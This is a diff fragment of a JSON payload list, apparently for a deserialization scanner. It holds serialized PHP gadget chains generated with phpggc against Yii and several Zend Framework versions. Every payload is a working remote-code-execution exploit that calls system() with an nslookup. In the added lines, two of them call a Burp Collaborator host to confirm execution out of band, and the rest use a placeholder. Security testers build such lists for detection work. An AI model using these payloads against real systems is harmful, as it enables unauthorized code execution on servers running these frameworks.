-    "payload": "O:11:\"CDbCriteria\":1:{s:6:\"params\";O:12:\"CMapIterator\":3:{s:16:\"CMapIterator_d\";O:10:\"CFileCache\":7:{s:9:\"keyPrefix\";s:0:\"\";s:7:\"hashKey\";b:0;s:10:\"serializer\";a:1:{i:1;s:6:\"system\";}s:9:\"cachePath\";s:10:\"data:text/\";s:14:\"directoryLevel\";i:0;s:11:\"embedExpiry\";b:1;s:15:\"cacheFileSuffix\";s:44:\";base64,OTk5OTk5OTk5OW5zbG9va3VwIENIQU5HRU1F\";}s:19:\"CMapIterator_keys\";a:1:{i:0;i:0;}s:18:\"CMapIterator_key\";i:0;}}"
+    "payload": "O:11:\"CDbCriteria\":1:{s:6:\"params\"%3BO:12:\"CMapIterator\":3:{s:16:\"%00CMapIterator%00_d\"%3BO:10:\"CFileCache\":7:{s:9:\"keyPrefix\"%3Bs:0:\"\"%3Bs:7:\"hashKey\"%3Bb:0%3Bs:10:\"serializer\"%3Ba:1:{i:1%3Bs:6:\"system\"%3B}s:9:\"cachePath\"%3Bs:10:\"data:text/\"%3Bs:14:\"directoryLevel\"%3Bi:0%3Bs:11:\"embedExpiry\"%3Bb:1%3Bs:15:\"cacheFileSuffix\"%3Bs:120:\"%3Bbase64,OTk5OTk5OTk5OW5zbG9va3VwIHBvaS1zbGluZ2VyLjJrbmF3eWJ5c20yYXpzajFtaG9saGR2NHN2eWxtYS5idXJwY29sbGFib3JhdG9yLm5ldA==\"%3B}s:19:\"%00CMapIterator%00_keys\"%3Ba:1:{i:0%3Bi:0%3B}s:18:\"%00CMapIterator%00_key\"%3Bi:0%3B}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "ZendFramework ? <= 1.12.20",
     "gen_with": "./phpggc ZendFramework/RCE1 <code>",
-    "payload": "O:8:\"Zend_Log\":1:{s:11:\"*_writers\";a:1:{i:0;O:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"*_eventsToMail\";a:1:{i:0;i:1;}s:22:\"*_layoutEventsToMail\";a:0:{}s:8:\"*_mail\";O:9:\"Zend_Mail\":0:{}s:10:\"*_layout\";O:11:\"Zend_Layout\":3:{s:13:\"*_inflector\";O:23:\"Zend_Filter_PregReplace\":2:{s:16:\"*_matchPattern\";s:7:\"/(.*)/e\";s:15:\"*_replacement\";s:28:\"system('nslookup CHANGEME');\";}s:20:\"*_inflectorEnabled\";b:1;s:10:\"*_layout\";s:6:\"layout\";}s:22:\"*_subjectPrependText\";N;}}}"
+    "payload": "O:8:\"Zend_Log\":1:{s:11:\"%00*%00_writers\"%3Ba:1:{i:0%3BO:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"%00*%00_eventsToMail\"%3Ba:1:{i:0%3Bi:1%3B}s:22:\"%00*%00_layoutEventsToMail\"%3Ba:0:{}s:8:\"%00*%00_mail\"%3BO:9:\"Zend_Mail\":0:{}s:10:\"%00*%00_layout\"%3BO:11:\"Zend_Layout\":3:{s:13:\"%00*%00_inflector\"%3BO:23:\"Zend_Filter_PregReplace\":2:{s:16:\"%00*%00_matchPattern\"%3Bs:7:\"/(.*)/e\"%3Bs:15:\"%00*%00_replacement\"%3Bs:83:\"system('nslookup poi-slinger.dizojeerc4nrmvq9wu03z4dbf2ls9h.burpcollaborator.net')%3B\"%3B}s:20:\"%00*%00_inflectorEnabled\"%3Bb:1%3Bs:10:\"%00*%00_layout\"%3Bs:6:\"layout\"%3B}s:22:\"%00*%00_subjectPrependText\"%3BN%3B}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "ZendFramework 1.11.12 <= 1.12.20",
     "gen_with": "./phpggc ZendFramework/RCE2 <function> <parameter>",
-    "payload": "O:17:\"Zend_Form_Element\":31:{s:8:\"*_name\";s:6:\"system\";s:14:\"*_decorators\";a:1:{i:0;O:24:\"Zend_Form_Decorator_Form\":5:{s:10:\"*_helper\";s:4:\"call\";s:13:\"*_placement\";s:6:\"APPEND\";s:11:\"*_element\";N;s:11:\"*_options\";a:0:{}s:13:\"*_separator\";s:1:\"\";}}s:8:\"*_view\";O:28:\"Zend_Cache_Frontend_Function\":1:{s:19:\"*_specificOptions\";a:3:{s:16:\"cache_by_default\";b:0;s:16:\"cached_functions\";a:0:{}s:20:\"non_cached_functions\";a:0:{}}}s:2:\"id\";s:17:\"nslookup CHANGEME\";s:6:\"helper\";s:8:\"formText\";s:14:\"*_allowEmpty\";b:1;s:31:\"*_autoInsertNotEmptyValidator\";b:1;s:13:\"*_belongsTo\";N;s:15:\"*_description\";N;s:32:\"*_disableLoadDefaultDecorators\";b:0;s:17:\"*_errorMessages\";a:0:{}s:10:\"*_errors\";a:0:{}s:25:\"*_errorMessageSeparator\";s:2:\"; \";s:11:\"*_filters\";a:0:{}s:10:\"*_ignore\";b:0;s:11:\"*_isArray\";b:0;s:11:\"*_isError\";b:0;s:17:\"*_isErrorForced\";b:0;s:9:\"*_label\";N;s:11:\"*_loaders\";a:0:{}s:12:\"*_messages\";a:0:{}s:9:\"*_order\";N;s:12:\"*_required\";b:0;s:14:\"*_translator\";N;s:22:\"*_translatorDisabled\";b:0;s:8:\"*_type\";N;s:14:\"*_validators\";a:0:{}s:18:\"*_validatorRules\";a:0:{}s:9:\"*_value\";N;s:22:\"*_isPartialRendering\";b:0;s:34:\"*_concatJustValuesInErrorMessage\";b:0;}"
+    "payload": "O:17:\"Zend_Form_Element\":31:{s:8:\"%00*%00_name\"%3Bs:6:\"system\"%3Bs:14:\"%00*%00_decorators\"%3Ba:1:{i:0%3BO:24:\"Zend_Form_Decorator_Form\":5:{s:10:\"%00*%00_helper\"%3Bs:4:\"call\"%3Bs:13:\"%00*%00_placement\"%3Bs:6:\"APPEND\"%3Bs:11:\"%00*%00_element\"%3BN%3Bs:11:\"%00*%00_options\"%3Ba:0:{}s:13:\"%00*%00_separator\"%3Bs:1:\"%0A\"%3B}}s:8:\"%00*%00_view\"%3BO:28:\"Zend_Cache_Frontend_Function\":1:{s:19:\"%00*%00_specificOptions\"%3Ba:3:{s:16:\"cache_by_default\"%3Bb:0%3Bs:16:\"cached_functions\"%3Ba:0:{}s:20:\"non_cached_functions\"%3Ba:0:{}}}s:2:\"id\"%3Bs:72:\"nslookup CHANGEME\"%3Bs:6:\"helper\"%3Bs:8:\"formText\"%3Bs:14:\"%00*%00_allowEmpty\"%3Bb:1%3Bs:31:\"%00*%00_autoInsertNotEmptyValidator\"%3Bb:1%3Bs:13:\"%00*%00_belongsTo\"%3BN%3Bs:15:\"%00*%00_description\"%3BN%3Bs:32:\"%00*%00_disableLoadDefaultDecorators\"%3Bb:0%3Bs:17:\"%00*%00_errorMessages\"%3Ba:0:{}s:10:\"%00*%00_errors\"%3Ba:0:{}s:25:\"%00*%00_errorMessageSeparator\"%3Bs:2:\"%3B \"%3Bs:11:\"%00*%00_filters\"%3Ba:0:{}s:10:\"%00*%00_ignore\"%3Bb:0%3Bs:11:\"%00*%00_isArray\"%3Bb:0%3Bs:11:\"%00*%00_isError\"%3Bb:0%3Bs:17:\"%00*%00_isErrorForced\"%3Bb:0%3Bs:9:\"%00*%00_label\"%3BN%3Bs:11:\"%00*%00_loaders\"%3Ba:0:{}s:12:\"%00*%00_messages\"%3Ba:0:{}s:9:\"%00*%00_order\"%3BN%3Bs:12:\"%00*%00_required\"%3Bb:0%3Bs:14:\"%00*%00_translator\"%3BN%3Bs:22:\"%00*%00_translatorDisabled\"%3Bb:0%3Bs:8:\"%00*%00_type\"%3BN%3Bs:14:\"%00*%00_validators\"%3Ba:0:{}s:18:\"%00*%00_validatorRules\"%3Ba:0:{}s:9:\"%00*%00_value\"%3BN%3Bs:22:\"%00*%00_isPartialRendering\"%3Bb:0%3Bs:34:\"%00*%00_concatJustValuesInErrorMessage\"%3Bb:0%3B}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "ZendFramework 2.0.1 <= ?",
     "gen_with": "./phpggc ZendFramework/RCE3 <function> <parameter>",
-    "payload": "O:15:\"Zend\\Log\\Logger\":1:{s:10:\"*writers\";a:1:{i:0;O:20:\"Zend\\Log\\Writer\\Mail\":3:{s:15:\"*eventsToMail\";a:1:{i:0;i:0;}s:21:\"*subjectPrependText\";s:0:\"\";s:24:\"*numEntriesPerPriority\";a:1:{i:0;O:14:\"Zend\\Tag\\Cloud\":2:{s:7:\"*tags\";a:1:{i:0;s:0:\"\";}s:15:\"*tagDecorator\";O:34:\"Zend\\Tag\\Cloud\\Decorator\\HtmlCloud\":3:{s:12:\"*separator\";s:0:\"\";s:10:\"*escaper\";O:20:\"Zend\\Escaper\\Escaper\":1:{s:18:\"*htmlAttrMatcher\";a:2:{i:0;O:23:\"Zend\\Filter\\FilterChain\":1:{s:10:\"*filters\";O:13:\"SplFixedArray\":2:{i:0;a:2:{i:0;O:14:\"Zend\\Json\\Expr\":1:{s:13:\"*expression\";s:17:\"nslookup CHANGEME\";}i:1;s:10:\"__toString\";}i:1;s:6:\"system\";}}i:1;s:6:\"filter\";}}s:11:\"*htmlTags\";a:1:{s:1:\"h\";a:1:{s:1:\"a\";s:1:\"!\";}}}}}}}}"
+    "payload": "O:15:\"Zend\\Log\\Logger\":1:{s:10:\"%00*%00writers\"%3Ba:1:{i:0%3BO:20:\"Zend\\Log\\Writer\\Mail\":3:{s:15:\"%00*%00eventsToMail\"%3Ba:1:{i:0%3Bi:0%3B}s:21:\"%00*%00subjectPrependText\"%3Bs:0:\"\"%3Bs:24:\"%00*%00numEntriesPerPriority\"%3Ba:1:{i:0%3BO:14:\"Zend\\Tag\\Cloud\":2:{s:7:\"%00*%00tags\"%3Ba:1:{i:0%3Bs:0:\"\"%3B}s:15:\"%00*%00tagDecorator\"%3BO:34:\"Zend\\Tag\\Cloud\\Decorator\\HtmlCloud\":3:{s:12:\"%00*%00separator\"%3Bs:0:\"\"%3Bs:10:\"%00*%00escaper\"%3BO:20:\"Zend\\Escaper\\Escaper\":1:{s:18:\"%00*%00htmlAttrMatcher\"%3Ba:2:{i:0%3BO:23:\"Zend\\Filter\\FilterChain\":1:{s:10:\"%00*%00filters\"%3BO:13:\"SplFixedArray\":2:{i:0%3Ba:2:{i:0%3BO:14:\"Zend\\Json\\Expr\":1:{s:13:\"%00*%00expression\"%3Bs:72:\"nslookup CHANGEME\"%3B}i:1%3Bs:10:\"__toString\"%3B}i:1%3Bs:6:\"system\"%3B}}i:1%3Bs:6:\"filter\"%3B}}s:11:\"%00*%00htmlTags\"%3Ba:1:{s:1:\"h\"%3Ba:1:{s:1:\"a\"%3Bs:1:\"!\"%3B}}}}}}}}"
   }
 ]
